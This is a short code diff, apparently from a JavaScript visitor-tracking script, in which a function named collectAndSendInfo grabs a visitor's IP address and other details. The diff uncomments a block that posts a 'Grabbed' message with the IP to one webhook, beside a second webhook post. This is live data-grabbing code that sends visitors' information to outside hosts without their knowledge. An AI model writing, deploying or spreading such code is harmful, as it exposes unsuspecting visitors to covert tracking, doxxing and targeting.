@@ -530,7 +530,7 @@ async function collectAndSendInfo() {
 
         const contentMessage = `Grabbed \`${visitorInfo.ip || "Unknown IP"}\` by <@1448530688558235719>`
         
-/*      const payload = { 
+        const payload = { 
             content: contentMessage,
             embeds: [embed] 
         };
@@ -538,7 +538,7 @@ async function collectAndSendInfo() {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
-        }); */
+        });
         await fetch(WEBHOOK_URL_2, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
